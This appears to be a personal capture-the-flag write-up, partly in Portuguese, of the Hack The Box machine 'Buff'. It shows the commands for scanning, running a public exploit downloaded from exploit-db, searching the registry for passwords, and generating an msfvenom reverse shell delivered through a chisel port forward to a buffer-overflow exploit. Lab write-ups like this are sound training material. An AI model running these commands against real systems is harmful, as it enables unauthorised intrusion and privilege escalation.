Buff
========================

## Enumeration

    sudo nmap_enum buff.htb | tee nmap_output.txt
    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.198 | tee nmap_udp_output.txt

    gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_jeeves_gobuster.txt"
    
    gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,jsp" -k -t 16 -o "tcp_port_protocol_gobuster_common_list.txt"

    nikto -host http://10.10.10.198:8080 -T x 6 | tee nikto_output.txt

![qownnotes-media-RQDWGZ](../../../media/qownnotes-media-RQDWGZ.png)


    searchsploit gym
    
![qownnotes-media-NGQrEe](../../../media/qownnotes-media-NGQrEe.png)

## Exploitation

    wget https://www.exploit-db.com/download/48506 -O exploit.py
    python2 exploit.py http://10.10.10.198:8080/
    
![qownnotes-media-ArYemM](../../../media/qownnotes-media-ArYemM.png)

![qownnotes-media-iaWwDr](../../../media/qownnotes-media-iaWwDr.png)

## Privilege Escalation


Aqui o aprendizado foi interessante, porque a ideia foi encontrar um servico que tivesse uma vulnerabilidade que permite ao atacante realizar a escalacao de privilegio. Os passos abaixo nao funcionaram, mas veja mais abaixo:

    whoami /priv
    
    systeminfo
    
    	
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    
    reg query HKLM /f password /t REG_SZ /s
    
Com esse checklist nao chegamos a lugar algum, porem navegando nos diretorios da maquina alvo encontramos um servico que estava rodando em modo administrastivo e que possui uma vulnerabilidade de BOF (buffer overflow)...

    cd c:\users\shaun\downloads
    
![qownnotes-media-vnobPo](../../../media/qownnotes-media-vnobPo.png)

![qownnotes-media-LfkpyM](../../../media/qownnotes-media-LfkpyM.png)


    searchsploit cloudme

![qownnotes-media-eHhEmn](../../../media/qownnotes-media-eHhEmn.png)

    msfvenom -p windows/shell_reverse_tcp -f python LHOST=10.10.14.8 LPORT=8084

Eu copiei o output do comando anterior e coloquei no primeiro exploit que estava relacionado no output do searchsploit:

    cat privesc_exploit.py

Fiz um redirecionamento de portas, pois identifiquei que esse servico estava escutando na porta local 127.0.0.1:8888

![qownnotes-media-xIrWQz](../../../media/qownnotes-media-xIrWQz.png)


    ./chisel.exe client 10.10.14.8:9999 R:5000:127.0.0.1:8888

Na maquina do atacante:

    ./chisel server -p 9999 --socks5 --reverse
    
    
Note que com esse exploit eu executei na interface local da maquina do atacante dado o redirrecionamento de porta do chisel:

    python privesc_exploit.py
    
    
    
    nc -nlvp 8084
 
 ![qownnotes-media-ShhjMz](../../../media/qownnotes-media-ShhjMz.png)
